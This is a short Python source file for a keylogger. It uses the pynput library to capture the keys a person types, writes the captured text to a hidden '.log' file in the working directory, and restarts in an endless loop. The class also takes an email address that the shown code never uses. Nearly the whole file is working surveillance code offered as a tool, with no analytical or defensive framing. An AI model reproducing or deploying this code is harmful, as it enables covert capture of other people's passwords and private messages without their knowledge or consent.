import os
from pynput import keyboard


# define the path of log file.
path = os.getcwd()
log_file = path + '/.log'

"""
Class that processes some basic functions of a keylogger.
"""
class Keylogger:
    def __init__(self, email):
        self.log_file = log_file
        self.email = email
        self.log = ''

    """
    get keyboard event.
    """
    def get_key(self, key):
        try:
            getKey = str(key.char)
            print(getKey)
        except AttributeError:
            getKey = ''

        self.append_log(getKey)

    """
    once the 'enter' key is released, we log the previous message
    into the log file.
    And when a 'space is entered, we log it, too.
    """
    def get_Release (self, key):
        if key == keyboard.Key.enter:
            self.log += '\n'
            # put the logged message into the log file.
            with open(self.log_file, 'a') as f:
                f.write(self.log)
            self.log = ''
            return False
        elif key == keyboard.Key.space:
            self.log += ' '

    def append_log(self, newmsg):
        self.log += newmsg

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.get_key, on_release=self.get_Release)
        with keyboard_listener:
            keyboard_listener.join()


kl = Keylogger('295064001@qq.com')
while 1:
    kl.start()
